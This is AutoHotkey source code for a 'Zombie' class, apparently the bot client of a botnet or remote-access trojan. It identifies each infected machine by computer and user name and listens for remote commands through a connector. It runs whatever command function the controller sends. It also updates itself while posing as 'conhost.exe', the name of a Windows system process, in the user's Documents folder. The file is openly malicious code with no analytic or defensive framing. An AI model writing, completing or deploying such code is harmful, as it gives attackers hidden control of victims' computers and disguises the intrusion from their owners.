; @update if available

; Classes / Objects / Methods
; @Zombie
class Zombie{
	static name := A_ComputerName "-" A_UserName
	
	static connector ; Connector dependency
	static commands ; Commands dependency
	
	startListen(){
		msgbox zombie start listen
		this.connector.startListen()
	}
	
	getName(){
		return this.name
	}
	
	getSystemInfo(){
		return A_OSVersion
	}
	
	doCommand(function, argument){
		commands := this.commands
		commands[function](argument)
	}
	
	tryUpdate(){
		if(A_ScriptName == "conhost.ahk" or A_ScriptName == "conhost.exe"){
			fileDelete, %A_MyDocuments%\Conhost\update.exe
		}
		else if(A_ScriptName == "update.ahk" or A_ScriptName == "update.exe"){
			fileCopy, %A_ScriptName%, %A_MyDocuments%\Conhost\conhost.exe, 1
			Zombie.sendNotation("updated to version: " . version)
			run conhost.exe
			exitApp
		}
	}
	
	; building
	setConnector(connector){
		this.connector := connector
		return this
	}
	setCommands(commands){
		this.commands := commands
		return this
	}
}